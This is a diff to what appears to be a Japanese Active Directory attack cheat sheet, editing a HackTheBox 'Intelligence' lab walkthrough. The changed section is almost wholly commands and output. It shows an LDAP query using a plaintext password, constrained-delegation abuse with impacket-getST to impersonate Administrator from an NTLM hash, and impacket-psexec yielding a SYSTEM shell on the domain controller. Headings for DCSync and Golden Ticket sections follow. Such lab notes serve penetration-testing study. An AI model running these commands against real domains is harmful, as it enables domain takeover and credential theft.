@@ -243,7 +243,7 @@
 * HTB: Intelligence
 
   ```console
-  ┌─[rio@parrot]─[~/Htb/Intelligence]
+  ┌─[✗]─[rio@parrot]─[~/Htb/Intelligence]
   └──╼ $ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb -b 'cn=svc_int,cn=managed service accounts,dc=intelligence,dc=htb'
   # extended LDIF
   #
@@ -266,24 +266,24 @@
    tb
   instanceType: 4
   whenCreated: 20210419004958.0Z
-  whenChanged: 20210714121947.0Z
+  whenChanged: 20210715114248.0Z
   uSNCreated: 12846
-  uSNChanged: 110719
+  uSNChanged: 110737
   name: svc_int
   objectGUID:: eaCA8SbzskmEoTSCQgjWQg==
   userAccountControl: 16781312
   badPwdCount: 0
   codePage: 0
   countryCode: 0
-  badPasswordTime: 132707386923375218
+  badPasswordTime: 0
   lastLogoff: 0
-  lastLogon: 132707387877640143
+  lastLogon: 132708229761633211
   localPolicyFlags: 0
   pwdLastSet: 132694880879752841
   primaryGroupID: 515
   objectSid:: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
   accountExpires: 9223372036854775807
-  logonCount: 2
+  logonCount: 3
   sAMAccountName: svc_int$
   sAMAccountType: 805306369
   dNSHostName: svc_int.intelligence.htb
@@ -291,7 +291,7 @@
    ion,DC=intelligence,DC=htb
   isCriticalSystemObject: FALSE
   dSCorePropagationData: 16010101000000.0Z
-  lastLogonTimestamp: 132707387877640143
+  lastLogonTimestamp: 132708229689371121
   msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
   msDS-SupportedEncryptionTypes: 28
   msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAZwEAAB0AAAAYAAAAWa6dT0SPVr+SpfQILta2E
@@ -312,7 +312,7 @@
   # numResponses: 2
   # numEntries: 1
   ┌─[rio@parrot]─[~/Htb/Intelligence]
-  └──╼ $impacket-getST -dc-ip intelligence.htb -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int$
+  └──╼ $impacket-getST -dc-ip intelligence.htb -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
   
   [*] Getting TGT for user
@@ -320,6 +320,24 @@
   [*]     Requesting S4U2self
   [*]     Requesting S4U2Proxy
   [*] Saving ticket in Administrator.ccache
+  ┌─[rio@parrot]─[~/Htb/Intelligence]
+  └──╼ $export KRB5CCNAME=./Administrator.ccache
+  ┌─[rio@parrot]─[~/Htb/Intelligence]
+  └──╼ $impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+  
+  [*] Requesting shares on dc.intelligence.htb.....
+  [*] Found writable share ADMIN$
+  [*] Uploading file FzYxsMAE.exe
+  [*] Opening SVCManager on dc.intelligence.htb.....
+  [*] Creating service mcQy on dc.intelligence.htb.....
+  [*] Starting service mcQy.....
+  [!] Press help for extra shell commands
+  Microsoft Windows [Version 10.0.17763.1879]
+  (c) 2018 Microsoft Corporation. All rights reserved.
+  
+  C:\Windows\system32>whoami
+  nt authority\system
   ```
 
 ## DCSync
@@ -458,7 +476,6 @@
   [*] Cleaning up...
   ```
 
-  
 
 ## Golden Ticket
 * ntds.ditなどから漏洩したkrbtgtのパスワードハッシュから、新規ユーザのGolden Tichketを生成
